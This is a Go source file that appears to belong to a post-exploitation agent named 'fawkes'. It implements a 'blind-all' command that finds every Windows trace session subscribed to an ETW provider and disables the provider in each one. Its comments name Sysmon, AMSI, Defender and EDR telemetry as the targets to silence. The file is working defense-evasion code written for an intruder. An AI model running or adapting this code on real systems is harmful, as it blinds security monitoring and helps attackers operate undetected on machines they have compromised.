//go:build windows
// +build windows

package commands

import (
	"encoding/binary"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// etwBlindAll disables a single ETW provider across every trace session that
// currently has it enabled, in one shot. This is a force-multiplier for `blind`
// (which targets one named session at a time): the operator supplies just the
// provider, and the agent enumerates which sessions consume it via
// EnumerateTraceGuidsEx(TraceGuidQueryInfo), then issues a DISABLE_PROVIDER
// call against each consuming session's handle.
//
// Use cases:
//   - Sysmon ships its events through "EventLog-Microsoft-Windows-Sysmon-Operational"
//     but EDR products may also subscribe via private autologger sessions; blind
//     against just the named session leaves the EDR collecting events.
//   - The AMSI provider is typically wired into multiple AppLocker/Defender
//     autologger sessions, all of which must be silenced.
//
// Requires Administrator/SYSTEM. Returns a per-session result table.
func etwBlindAll(provider string) structs.CommandResult {
	if provider == "" {
		return errorResult("Error: provider is required for blind-all action (GUID or shorthand)\n" +
			"Shorthands: sysmon, amsi, powershell, dotnet, winrm, wmi, security-auditing, kernel-process, kernel-file, kernel-network, kernel-registry, api-calls, task-scheduler, dns-client")
	}

	providerGUIDStr, resolvedName := resolveProviderGUID(provider)
	if providerGUIDStr == "" {
		return errorf("Could not resolve provider '%s' — use a GUID or shorthand", provider)
	}

	guidStr := providerGUIDStr
	if !strings.HasPrefix(guidStr, "{") {
		guidStr = "{" + guidStr + "}"
	}
	providerGUID, err := windows.GUIDFromString(guidStr)
	if err != nil {
		return errorf("Invalid provider GUID '%s': %v", providerGUIDStr, err)
	}

	// Step 1: Find sessions consuming this provider via TraceGuidQueryInfo.
	loggerIDs, instances, err := etwSessionsForProvider(&providerGUID)
	if err != nil {
		return errorf("EnumerateTraceGuidsEx failed: %v", err)
	}
	if len(loggerIDs) == 0 {
		displayName := resolvedName
		if displayName == "" {
			displayName = providerGUIDStr
		}
		return successf("Provider '%s' (%s) is not currently enabled in any active session — nothing to disable.\nProvider has %d registered instance(s) but zero session subscriptions.",
			displayName, providerGUIDStr, instances)
	}

	// Step 2: Build a LoggerID → (name, handle) map by enumerating all trace sessions.
	sessionMap, err := etwEnumerateSessionHandles()
	if err != nil {
		return errorf("QueryAllTracesW failed: %v", err)
	}

	// Step 3: Issue EnableTraceEx2 DISABLE for each consuming session.
	type sessionResult struct {
		LoggerID    int
		SessionName string
		Disabled    bool
		ErrorCode   uint32
	}
	var results []sessionResult
	for _, lid := range loggerIDs {
		sr := sessionResult{LoggerID: lid, SessionName: "(unknown)"}
		entry, ok := sessionMap[uint16(lid)]
		if !ok {
			sr.ErrorCode = 0xFFFFFFFF
			results = append(results, sr)
			continue
		}
		sr.SessionName = entry.name

		r1, _, _ := procEnableTraceEx2.Call(
			uintptr(entry.handle),
			uintptr(unsafe.Pointer(&providerGUID)),
			eventControlCodeDisableProvider,
			0, // Level: TRACE_LEVEL_NONE
			0, // MatchAnyKeyword
			0, // MatchAllKeyword
			0, // Timeout
			0, // EnableParameters: NULL
		)
		if r1 == 0 {
			sr.Disabled = true
		} else {
			sr.ErrorCode = uint32(r1)
		}
		results = append(results, sr)
	}

	// Build output table.
	displayName := resolvedName
	if displayName == "" {
		displayName = providerGUIDStr
	}

	successCount := 0
	for _, r := range results {
		if r.Disabled {
			successCount++
		}
	}

	var sb strings.Builder
	sb.WriteString(fmt.Sprintf("ETW blind-all — provider '%s' (%s)\n", displayName, providerGUIDStr))
	sb.WriteString(fmt.Sprintf("Disabled in %d / %d consuming session(s)\n\n", successCount, len(results)))
	sb.WriteString(fmt.Sprintf("%-6s %-40s %s\n", "LOGGER", "SESSION NAME", "RESULT"))
	sb.WriteString(strings.Repeat("-", 80) + "\n")
	for _, r := range results {
		result := "DISABLED"
		if !r.Disabled {
			if r.ErrorCode == 0xFFFFFFFF {
				result = "skipped (no handle for logger)"
			} else if r.ErrorCode == 5 {
				result = fmt.Sprintf("error 5 (access denied)")
			} else {
				result = fmt.Sprintf("error %d (0x%X)", r.ErrorCode, r.ErrorCode)
			}
		}
		sb.WriteString(fmt.Sprintf("%-6d %-40s %s\n", r.LoggerID, truncStr(r.SessionName, 40), result))
	}

	if successCount == 0 {
		return errorResult(sb.String())
	}
	return successResult(sb.String())
}

// etwSessionsForProvider returns the LoggerIDs of every trace session that has
// the given provider GUID enabled. The second return value is the total number
// of provider instances (registered processes) for diagnostic context.
func etwSessionsForProvider(guid *windows.GUID) ([]int, int, error) {
	var infoSize uint32
	procEnumerateTraceGuidsEx.Call(
		traceGuidQueryInfo,
		uintptr(unsafe.Pointer(guid)), 16,
		0, 0,
		uintptr(unsafe.Pointer(&infoSize)),
	)
	if infoSize == 0 {
		return nil, 0, nil // provider not registered or unsupported
	}

	buf := make([]byte, infoSize)
	r1, _, err := procEnumerateTraceGuidsEx.Call(
		traceGuidQueryInfo,
		uintptr(unsafe.Pointer(guid)), 16,
		uintptr(unsafe.Pointer(&buf[0])), uintptr(infoSize),
		uintptr(unsafe.Pointer(&infoSize)),
	)
	if r1 != 0 {
		return nil, 0, fmt.Errorf("error %d (%v)", uint32(r1), err)
	}

	loggerIDs, instances := parseProviderLoggerIDs(buf)
	return loggerIDs, instances, nil
}

// parseProviderLoggerIDs walks a TRACE_GUID_INFO buffer and returns the unique
// LoggerIDs of sessions consuming the provider.
//
// Layout (mirrors parseProviderInstanceInfo in etw_providers.go):
//
//	TRACE_GUID_INFO: InstanceCount(4) Reserved(4)
//	InstanceCount × TRACE_PROVIDER_INSTANCE_INFO:
//	  NextOffset(4) EnableCount(4) Pid(4) Flags(4)
//	  EnableCount × TRACE_ENABLE_INFO:
//	    IsEnabled(4) Level(1) Reserved1(1) LoggerId(2) EnableProperty(4) MatchAnyKeyword(8) MatchAllKeyword(8)
func parseProviderLoggerIDs(data []byte) ([]int, int) {
	if len(data) < 8 {
		return nil, 0
	}
	instanceCount := int(binary.LittleEndian.Uint32(data[0:4]))
	if instanceCount == 0 {
		return nil, 0
	}

	seen := map[uint16]struct{}{}
	var loggerIDs []int

	offset := 8
	for i := 0; i < instanceCount && offset+16 <= len(data); i++ {
		nextOff := binary.LittleEndian.Uint32(data[offset : offset+4])
		enableCount := binary.LittleEndian.Uint32(data[offset+4 : offset+8])

		enableOffset := offset + 16
		for j := uint32(0); j < enableCount && enableOffset+24 <= len(data); j++ {
			isEnabled := binary.LittleEndian.Uint32(data[enableOffset : enableOffset+4])
			loggerID := binary.LittleEndian.Uint16(data[enableOffset+6 : enableOffset+8])
			if isEnabled != 0 {
				if _, ok := seen[loggerID]; !ok {
					seen[loggerID] = struct{}{}
					loggerIDs = append(loggerIDs, int(loggerID))
				}
			}
			enableOffset += 24
		}

		if nextOff == 0 {
			break
		}
		offset += int(nextOff)
	}
	return loggerIDs, instanceCount
}

type etwSessionEntry struct {
	name   string
	handle uint64
}

// etwEnumerateSessionHandles calls QueryAllTracesW and returns a map keyed by
// the low 16 bits of WNODE_HEADER.HistoricalContext (the LoggerID) to session
// name and full TRACEHANDLE.
func etwEnumerateSessionHandles() (map[uint16]etwSessionEntry, error) {
	const maxSessions = 64
	propsBufs := make([][]byte, maxSessions)
	propsPtrs := make([]uintptr, maxSessions)
	for i := range propsBufs {
		propsBufs[i] = make([]byte, eventTracePropsSize)
		binary.LittleEndian.PutUint32(propsBufs[i][0:4], eventTracePropsSize)
		binary.LittleEndian.PutUint32(propsBufs[i][116:120], 120) // LoggerNameOffset
		binary.LittleEndian.PutUint32(propsBufs[i][112:116], 632) // LogFileNameOffset
		propsPtrs[i] = uintptr(unsafe.Pointer(&propsBufs[i][0]))
	}

	var sessionCount uint32
	r1, _, err := procQueryAllTracesW.Call(
		uintptr(unsafe.Pointer(&propsPtrs[0])),
		maxSessions,
		uintptr(unsafe.Pointer(&sessionCount)),
	)
	if r1 != 0 {
		return nil, fmt.Errorf("error %d (%v)", uint32(r1), err)
	}

	out := make(map[uint16]etwSessionEntry, sessionCount)
	for i := uint32(0); i < sessionCount; i++ {
		buf := propsBufs[i]
		// HistoricalContext at WNODE_HEADER offset 8 (8 bytes) — TRACEHANDLE.
		// Low 16 bits = LoggerID assigned by the system.
		handle := binary.LittleEndian.Uint64(buf[8:16])
		loggerID := uint16(handle & 0xFFFF)

		name := parseLoggerName(buf)
		if name == "" {
			name = fmt.Sprintf("Session_%d", loggerID)
		}
		// Don't overwrite an existing entry — first-wins is fine for our purposes.
		if _, exists := out[loggerID]; !exists {
			out[loggerID] = etwSessionEntry{name: name, handle: handle}
		}
	}
	return out, nil
}

// parseLoggerName decodes the UTF-16LE session name embedded in an
// EVENT_TRACE_PROPERTIES buffer at LoggerNameOffset (offset 116).
func parseLoggerName(buf []byte) string {
	if len(buf) < 120 {
		return ""
	}
	loggerNameOffset := binary.LittleEndian.Uint32(buf[116:120])
	if loggerNameOffset == 0 || int(loggerNameOffset) >= len(buf)-2 {
		return ""
	}
	nameBytes := buf[loggerNameOffset:]
	u16s := make([]uint16, 0, 64)
	for j := 0; j+1 < len(nameBytes); j += 2 {
		ch := binary.LittleEndian.Uint16(nameBytes[j : j+2])
		if ch == 0 {
			break
		}
		u16s = append(u16s, ch)
	}
	return windows.UTF16ToString(u16s)
}
